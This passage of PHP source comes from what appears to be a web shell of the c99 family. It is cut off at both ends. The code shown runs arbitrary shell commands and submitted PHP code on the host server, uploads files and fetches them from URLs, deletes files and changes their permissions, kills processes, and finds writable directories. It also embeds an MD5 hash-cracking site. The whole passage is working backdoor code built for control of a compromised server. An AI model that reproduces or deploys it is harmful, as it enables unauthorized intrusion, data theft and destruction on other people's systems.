         "<tr><td>Message:</td><td><textarea name=\"sender_body\" cols=80 rows=10>".htmlspecialchars($sender_body)."</textarea><br>".
         "<tr><td></td><td><input type=\"submit\" name=\"submit\" value=\"Send\"></form></td></tr>".
         "</table>\n";
  }
}
if ($act == 'dec') {
?>
<iframe 
src ="http://www.md5decrypter.co.uk/"
height="600"
width="100%">
</iframe>
<?php
}
if ($act == 'rev') {
?>
<iframe 
src ="http://www.yougetsignal.com/tools/web-sites-on-web-server//"
height="600"
width="100%">
</iframe>
<?php
}
if ($act == "search") {
  echo "<div class=barheader>.: $sh_name File-System Search :.</div>";
  if (empty($search_in)) {$search_in = $d;}
  if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
  if (empty($search_text_wwo)) {$search_text_regexp = 0;}
  if (!empty($submit)) {
    $found = array();
    $found_d = 0;
    $found_f = 0;
    $search_i_f = 0;
    $search_i_d = 0;
    $a = array(
        "name"=>$search_name,
        "name_regexp"=>$search_name_regexp,
        "text"=>$search_text,
        "text_regexp"=>$search_text_regxp,
        "text_wwo"=>$search_text_wwo,
        "text_cs"=>$search_text_cs,
        "text_not"=>$search_text_not
    );
    $searchtime = getmicrotime();
    $in = array_unique(explode(";",$search_in));
    foreach($in as $v) {tpfsearch($v);}
    $searchtime = round(getmicrotime()-$searchtime,4);
    if (count($found) == 0) {echo "No files found!";}
    else {
      $ls_arr = $found;
      $disp_fullpath = TRUE;
      $act = "ls";
    }
  }
  echo "<table class=contents>".
       "<tr><td><form method=POST>".
       "<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">".
       "File or folder Name:</td><td><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - Regular Expression</td></tr>".
       "<tr><td>Look in (Separate by \";\"):</td><td><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\"></td></tr>".
       "<tr><td>A word or phrase in the file:</td><td><textarea name=\"search_text\" cols=\"50\" rows=\"5\">".htmlspecialchars($search_text)."</textarea></td></tr>".
       "<tr><td></td><td><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> Regular Expression".
       "  <input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> Whole words only".
       "  <input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> Case sensitive".
       "  <input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> Find files NOT containing the text</td></tr>".
       "<tr><td></td><td><input type=submit name=submit value=\"Search\"></form></td></tr>".
       "</table>\n";
  if ($act == "ls") {
    $dspact = $act;
    echo $searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b>".
         "<hr size=\"1\" noshade>";
  }
}
if ($act == "chmod") {
  $mode = fileperms($d.$f);
  if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
  else {
    $form = TRUE;
    if ($chmod_submit) {
      $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
      if (chmod($d.$f,$octet)) { $act = "ls"; $form = FALSE; $err = ""; }
      else {$err = "Can't chmod to ".$octet.".";}
    }
    if ($form) {
      $perms = parse_perms($mode);
      echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
    }
  }
}
if ($act == "upload") {
  $uploadmess = "";
  $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
  if (empty($uploadpath)) {$uploadpath = $d;}
  elseif (substr($uploadpath,-1) != DIRECTORY_SEPARATOR) {$uploadpath .= DIRECTORY_SEPARATOR;}
  if (!empty($submit)) {
    global $_FILES;
    $uploadfile = $_FILES["uploadfile"];
    if (!empty($uploadfile["tmp_name"])) {
      if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
      else {$destin = $userfilename;}
      if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {
        $uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";
      }
      else { $uploadmess .= "File uploaded successfully!<br>".$uploadpath.$destin; }
    }
    else { echo "No file to upload!"; }
  }
  if ($miniform) {
    echo "<b>".$uploadmess."</b>";
    $act = "ls";
  }
  else {
    echo "<table><tr><td colspan=2 class=barheader>".
         ".: File Upload :.</td>".
         "<td colspan=2>".$uploadmess."</td></tr>".
         "<tr><td><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST>".
         "From Your Computer:</td><td><input name=\"uploadfile\" type=\"file\"></td></tr>".
         "<tr><td>From URL:</td><td><input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"></td></tr>".
         "<tr><td>Target Directory:</td><td><input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"></td></tr>".
         "<tr><td>Target File Name:</td><td><input name=uploadfilename size=25></td></tr>".
         "<tr><td></td><td><input type=checkbox name=uploadautoname value=1 id=df4> Convert file name to lowercase</td></tr>".
         "<tr><td></td><td><input type=submit name=submit value=\"Upload\">".
         "</form></td></tr></table>";
  }
}
if ($act == "delete") {
  $delerr = "";
  foreach ($actbox as $v) {
    $result = FALSE;
    $result = fs_rmobj($v);
    if (!$result) { $delerr .= "Can't delete ".htmlspecialchars($v)."<br>"; }
  }
  if (!empty($delerr)) { echo "<b>Error deleting:</b><br>".$delerr; }
  $act = "ls";
}
if (!$usefsbuff) {
  if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {
    echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$usefsbuff\" as TRUE.</center>";
  }
}
else {
  if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); tp_sess_put($sess_data); $act = "ls"; }
  elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); tp_sess_put($sess_data); $act = "ls";}
  elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} tp_sess_put($sess_data); $act = "ls";}
  if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); tp_sess_put($sess_data);}
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    tp_sess_put($sess_data);
    if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
    $act = "ls";
  }
  elseif ($actarcbuff) {
    $arcerr = "";
    if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
    else {$ext = ".tar.gz";}
    if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
    $cmdline .= " ".$actarcbuff_path;
    $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
    foreach($objects as $v) {
      $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
      if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
      if (is_dir($v)) {
        if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
        $v .= "*";
      }
      $cmdline .= " ".$v;
    }
    $tmp = realpath(".");
    chdir($d);
    $ret = tpexec($cmdline);
    chdir($tmp);
    if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
    $ret = str_replace("\r\n","\n",$ret);
    $ret = explode("\n",$ret);
    if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
    foreach($sess_data["cut"] as $k=>$v) {
      if (in_array($v,$ret)) {fs_rmobj($v);}
      unset($sess_data["cut"][$k]);
    }
    tp_sess_put($sess_data);
    if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
    $act = "ls";
  }
  elseif ($actpastebuff) {
    $psterr = "";
    foreach($sess_data["copy"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
      if ($copy_unset) {unset($sess_data["copy"][$k]);}
    }
    foreach($sess_data["cut"] as $k=>$v) {
      $to = $d.basename($v);
      if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
      unset($sess_data["cut"][$k]);
    }
    tp_sess_put($sess_data);
    if (!empty($psterr)) {echo "<b>Error pasting:</b><br>".$psterr;}
    $act = "ls";
  }
}
if ($act == "cmd") {
  @chdir($chdir);
  if (!empty($submit)) {
    echo "<div class=barheader>.: Results of Execution :.</div>\n";
    $olddir = realpath(".");
    @chdir($d);
    $ret = tpexec($cmd);
    $ret = convert_cyr_string($ret,"d","w");
    if ($cmd_txt) {
      $rows = count(explode("\n",$ret))+1;
      if ($rows < 10) { $rows = 10; } else { $rows = 30; }
      $cols = 130;
      echo "<textarea class=shell cols=\"$cols\" rows=\"$rows\" readonly>".htmlspecialchars($ret)."</textarea>\n";
      //echo "<div align=left><pre>".htmlspecialchars($ret)."</pre></div>";
    }
    else { echo $ret."<br>"; }
    @chdir($olddir);
  }
}
if ($act == "ls") {
  if (count($ls_arr) > 0) { $list = $ls_arr; }
  else {
    $list = array();
    if ($h = @opendir($d)) {
      while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
      closedir($h);
    }
  }
  if (count($list) == 0) { echo "<div class=fxerrmsg>Can't open folder (".htmlspecialchars($d).")!</div>";}
  else {
    $objects = array();
    $vd = "f"; //Viewing mode
    if ($vd == "f") {
      $objects["head"] = array();
      $objects["folders"] = array();
      $objects["links"] = array();
      $objects["files"] = array();
      foreach ($list as $v) {
        $o = basename($v);
        $row = array();
        if ($o == ".") {$row[] = $d.$o; $row[] = "CURDIR";}
        elseif ($o == "..") {$row[] = $d.$o; $row[] = "UPDIR";}
        elseif (is_dir($v)) {
          if (is_link($v)) {$type = "LINK";}
          else {$type = "DIR";}
          $row[] = $v;
          $row[] = $type;
        }
        elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
        $row[] = filemtime($v);
        if (!$win) {
          $ow = posix_getpwuid(fileowner($v));
          $gr = posix_getgrgid(filegroup($v));
          $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
        }
        $row[] = fileperms($v);
        if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
        elseif (is_link($v)) {$objects["links"][] = $row;}
        elseif (is_dir($v)) {$objects["folders"][] = $row;}
        elseif (is_file($v)) {$objects["files"][] = $row;}
        $i++;
      }
      $row = array();
      $row[] = "<b>Name</b>";
      $row[] = "<b>Size</b>";
      $row[] = "<b>Date Modified</b>";
      if (!$win) {$row[] = "<b>Owner/Group</b>";}
      $row[] = "<b>Perms</b>";
      $row[] = "<b>Action</b>";
      $parsesort = parsesort($sort);
      $sort = $parsesort[0].$parsesort[1];
      $k = $parsesort[0];
      if ($parsesort[1] != "a") {$parsesort[1] = "d";}
      $y = " <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
      $y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";
      $row[$k] .= $y;
      for($i=0;$i<count($row)-1;$i++) {
        if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}
      }
      $v = $parsesort[0];
      usort($objects["folders"], "tabsort");
      usort($objects["links"], "tabsort");
      usort($objects["files"], "tabsort");
      if ($parsesort[1] == "d") {
        $objects["folders"] = array_reverse($objects["folders"]);
        $objects["files"] = array_reverse($objects["files"]);
      }
      $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
      $tab = array();
      $tab["cols"] = array($row);
      $tab["head"] = array();
      $tab["folders"] = array();
      $tab["links"] = array();
      $tab["files"] = array();
      $i = 0;
      foreach ($objects as $a) {
        $v = $a[0];
        $o = basename($v);
        $dir = dirname($v);
        if ($disp_fullpath) {$disppath = $v;}
        else {$disppath = $o;}
        $disppath = str2mini($disppath,60);
        if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
        elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
        foreach ($regxp_highlight as $r) {
          if (ereg($r[0],$o)) {
            if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; tpshexit();}
            else {
              $r[1] = round($r[1]);
              $isdir = is_dir($v);
              if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) {
                if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
                $disppath = $r[2].$disppath.$r[3];
                if ($r[4]) {break;}
              }
            }
          }
        }
        $uo = urlencode($o);
        $ud = urlencode($dir);
        $uv = urlencode($v);
        $row = array();
        if ($o == ".") {
          $row[] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."act=img&img=small_dir\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "CURDIR";
        }
        elseif ($o == "..") {
          $row[] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\"><img src=\"".$surl."act=img&img=ext_lnk\" border=\"0\">&nbsp;".$o."</a>";
          $row[] = "UPDIR";
        }
        elseif (is_dir($v)) {
          if (is_link($v)) {
            $disppath .= " => ".readlink($v);
            $type = "LINK";
            $row[] = "<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."act=img&img=ext_lnk\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          else {
            $type = "DIR";
            $row[] =  "<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\"><img src=\"".$surl."act=img&img=small_dir\" border=\"0\">&nbsp;[".$disppath."]</a>";
          }
          $row[] = $type;
        }
        elseif(is_file($v)) {
          $ext = explode(".",$o);
          $c = count($ext)-1;
          $ext = $ext[$c];
          $ext = strtolower($ext);
          $row[] =  "<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$disppath."</a>";
          $row[] = view_size($a[1]);
        }
        $row[] = @date("d.m.Y H:i:s",$a[2]);
        if (!$win) { $row[] = $a[3]; }
        $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
        if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
        else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
        if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" border=\"0\"></a>&nbsp;".$checkbox;}
        else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" border=\"0\"></a>&nbsp;".$checkbox;}
        if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
        elseif (is_link($v)) {$tab["links"][] = $row;}
        elseif (is_dir($v)) {$tab["folders"][] = $row;}
        elseif (is_file($v)) {$tab["files"][] = $row;}
        $i++;
      }
    }
    // Compiling table
    $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
    echo "<div class=barheader>.: ";
    if (!empty($fx_infohead)) { echo $fx_infohead; }
    else { echo "Directory List (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders)"; }
    echo " :.</div>\n";
    echo "<form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=\"".$dspact."\"><input type=hidden name=d value=".$d.">".
         "<table class=explorer>";
    foreach($table as $row) {
      echo "<tr>";
      foreach($row as $v) {echo "<td>".$v."</td>";}
      echo "</tr>\r\n";
    }
    echo "</table>".
         "<script>".
         "function ls_setcheckboxall(status) {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id <= num) { document.getElementById('actbox'+id).checked = status; id++; }".
         "}".
         "function ls_reverse_all() {".
         " var id = 1; var num = ".(count($table)-2).";".
         " while (id <= num) { document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; id++; }".
         "}".
         "</script>".
         "<div align=\"right\">".
         "<input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\">".
         "<img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
    if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff)) {
      echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"fx_archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
    }
    echo "<select name=act><option value=\"".$act."\">With selected:</option>";
    echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
    echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
    if ($usefsbuff) {
      echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
      echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
      echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
    }
    echo "</select>&nbsp;<input type=submit value=\"Confirm\"></div>";
    echo "</form>";
  }
}

if ($act == "phpfsys") { 
  echo "<div align=left>";
  $fsfunc = $phpfsysfunc;
  if ($fsfunc=="copy") {
    if (!copy($arg1, $arg2)) { echo "Failed to copy $arg1...\n";}
    else { echo "<b>Success!</b> $arg1 copied to $arg2\n"; }
  }
  elseif ($fsfunc=="rename") {
    if (!rename($arg1, $arg2)) { echo "Failed to rename/move $arg1!\n";}
    else { echo "<b>Success!</b> $arg1 renamed/moved to $arg2\n"; }
  }
  elseif ($fsfunc=="chmod") {
    if (!chmod($arg1,$arg2)) { echo "Failed to chmod $arg1!\n";}
    else { echo "<b>Perm for $arg1 changed to $arg2!</b>\n"; }
  }
  elseif ($fsfunc=="read") {
    $darg = $d.$arg1;
    if ($hasil = @file_get_contents($darg)) {
      echo "<b>Filename:</b> ".$darg."<br>";
      echo "<center><textarea cols=135 rows=30>";
      echo htmlentities($hasil);
      echo "</textarea></center>\n";
    }
    else { echo "<div class=fxerrmsg> Couldn't open ".$darg."<div>"; }
  }
  elseif ($fsfunc=="write") {
    $darg = $d.$arg1;
    if(@file_put_contents($darg,$arg2)) {
      echo "<b>Saved!</b> ".$darg;
    }
    else { echo "<div class=fxerrmsg>Can't write to $darg!</div>"; }
  }
  elseif ($fsfunc=="downloadbin") {
    $handle = fopen($arg1, "rb");
    $contents = '';
    while (!feof($handle)) {
      $contents .= fread($handle, 8192);
    }
    $r = @fopen($d.$arg2,'w');
    if (fwrite($r,$contents)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
    else { echo "<div class=fxerrmsg>Can't write to ".$d.$arg2."!</div>"; }
    fclose($r);
    fclose($handle);
  }
  elseif ($fsfunc=="download") {
    $text = implode('', file($arg1));
    if ($text) {
      $r = @fopen($d.$arg2,'w');
      if (fwrite($r,$text)) { echo "<b>Success!</b> $arg1 saved to ".$d.$arg2." (".view_size(filesize($d.$arg2)).")"; }
      else { echo "<div class=fxerrmsg>Can't write to ".$d.$arg2."!</div>"; }
      fclose($r);
    }
    else { echo "<div class=fxerrmsg>Can't download from $arg1!</div>";}
  }
  elseif ($fsfunc=='mkdir') {
    $thedir = $d.$arg1;
    if ($thedir != $d) {
      if (file_exists($thedir)) { echo "<b>Already exists:</b> ".htmlspecialchars($thedir); }
      elseif (!mkdir($thedir)) { echo "<b>Access denied:</b> ".htmlspecialchars($thedir); }
      else { echo "<b>Dir created:</b> ".htmlspecialchars($thedir);}
    }
    else { echo "Can't create current dir:<b> $thedir</b>"; }
  }
  elseif ($fsfunc=='fwritabledir') {
    function recurse_dir($dir,$max_dir) {
      global $dir_count;
      $dir_count++;
      if( $cdir = dir($dir) ) {
        while( $entry = $cdir-> read() ) {
          if( $entry != '.' && $entry != '..' ) {
            if(is_dir($dir.$entry) && is_writable($dir.$entry) ) {
             if ($dir_count > $max_dir) { return; }
              echo "[".$dir_count."] ".$dir.$entry."\n";
              recurse_dir($dir.$entry.DIRECTORY_SEPARATOR,$max_dir);
            }
          }
        }
        $cdir->close();
      }
    }
    if (!$arg1) { $arg1 = $d; }
    if (!$arg2) { $arg2 = 10; }
    if (is_dir($arg1)) {
      echo "<b>Writable directories (Max: $arg2) in:</b> $arg1<hr noshade size=1>";
      echo "<pre>";
      recurse_dir($arg1,$arg2);
      echo "</pre>";
      $total = $dir_count - 1;
      echo "<hr noshade size=1><b>Founds:</b> ".$total." of <b>Max</b> $arg2";
    }
    else {
      echo "<div class=fxerrmsg>Directory is not exist or permission denied!</div>";
    }
  }
  else {
    if (!$arg1) { echo "<div class=fxerrmsg>No operation! Please fill parameter [A]!</div>\n"; }
    else {
      if ($hasil = $fsfunc($arg1)) {
        echo "<b>Result of $fsfunc $arg1:</b><br>";
        if (!is_array($hasil)) { echo "$hasil\n"; }
        else {
          echo "<pre>";
          foreach ($hasil as $v) { echo $v."\n"; }
          echo "</pre>";
        }
      }
      else { echo "<div class=fxerrmsg>$fsfunc $arg1 failed!</div>\n"; }
    }
  }
  echo "</div>\n";
}
if ($act == "processes") {
  echo "<div class=barheader>.: Processes :.</div>\n";
  if (!$win) { $handler = "ps aux".($grep?" | grep '".addslashes($grep)."'":""); }
  else { $handler = "tasklist"; }
  $ret = tpexec($handler);
  if (!$ret) { echo "Can't execute \"".$handler."\"!"; }
  else {
    if (empty($processes_sort)) { $processes_sort = $sort_default; }
    $parsesort = parsesort($processes_sort);
    if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
    $k = $parsesort[0];
    if ($parsesort[1] != "a") {
      $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" border=\"0\"></a>";
    }
    else {
      $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";
    }
    $ret = htmlspecialchars($ret);
    if (!$win) { //Not Windows
      if ($pid) {
        if (is_null($sig)) { $sig = 9; }
        echo "Sending signal ".$sig." to #".$pid."... ";
        if (posix_kill($pid,$sig)) { echo "OK."; } else { echo "ERROR."; }
      }
      while (ereg("  ",$ret)) { $ret = str_replace("  "," ",$ret); }
      $stack = explode("\n",$ret);
      $head = explode(" ",$stack[0]);
      unset($stack[0]);
      for($i=0;$i<count($head);$i++) {
        if ($i != $k) {
          $head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";
        }
      }
      $head[$i] = "";
      $prcs = array();
      foreach ($stack as $line) {
        if (!empty($line)) {
          $line = explode(" ",$line);
          $line[10] = join(" ",array_slice($line,10));
          $line = array_slice($line,0,11);
          if ($line[0] == get_current_user()) { $line[0] = "<font color=green>".$line[0]."</font>"; }
          $line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
          $prcs[] = $line;
        }
      }
    }
    
    else {
      while (ereg("  ",$ret)) { $ret = str_replace("  "," ",$ret); }
      while (ereg("=",$ret)) { $ret = str_replace("=","",$ret); }
      $ret = convert_cyr_string($ret,"d","w");
      $stack = explode("\n",$ret);
      unset($stack[0],$stack[2]);
      $stack = array_values($stack);
      $stack[0]=str_replace("Image Name","ImageName",$stack[0]);
      $stack[0]=str_replace("Session Name","SessionName",$stack[0]);
      $stack[0]=str_replace("Mem Usage","MemoryUsage",$stack[0]);
      $head = explode(" ",$stack[0]);
      $stack = array_slice($stack,1);
      $head = array_values($head);
      if ($parsesort[1] != "a") { $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" border=\"0\"></a>"; }
      else { $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" border=\"0\"></a>"; }
      if ($k > count($head)) {$k = count($head)-1;}
      for($i=0;$i<count($head);$i++) {
        if ($i != $k) { $head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>"; }
      }
      $prcs = array();
      unset($stack[0]);
      foreach ($stack as $line) {
        if (!empty($line)) {
          $line = explode(" ",$line);
          $line[4] = str_replace(".","",$line[4]);
          $line[4] = intval($line[4]) * 1024;
          unset($line[5]);
          $prcs[] = $line;
        }
      }
    }
    $head[$k] = "<b>".$head[$k]."</b>".$y;
    $v = $processes_sort[0];
    usort($prcs,"tabsort");
    if ($processes_sort[1] == "d") { $prcs = array_reverse($prcs); }
    $tab = array();
    $tab[] = $head;
    $tab = array_merge($tab,$prcs);
    echo "<table class=explorer>\n";
    foreach($tab as $i=>$k) {
      echo "<tr>";
      foreach($k as $j=>$v) {
        if ($win and $i > 0 and $j == 4) { $v = view_size($v); }
        echo "<td>".$v."</td>";
      }
      echo "</tr>\n";
    }
    echo "</table>";
  }
}
if ($act == "eval") {
  if (!empty($eval)) {
    echo "Result of execution this PHP-code:<br>";
    $tmp = @ob_get_contents();
    $olddir = realpath(".");
    @chdir($d);
    if ($tmp) {
      @ob_clean();
      eval($eval);
      $ret = @ob_get_contents();
      $ret = convert_cyr_string($ret,"d","w");
      @ob_clean();
      echo $tmp;
      if ($eval_txt) {
        $rows = count(explode("\r\n",$ret))+1;
        if ($rows < 10) {$rows = 10;}
        echo "<br><textarea cols=\"115\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
      }
      else {echo $ret."<br>";}
    }
    else {
      if ($eval_txt) {
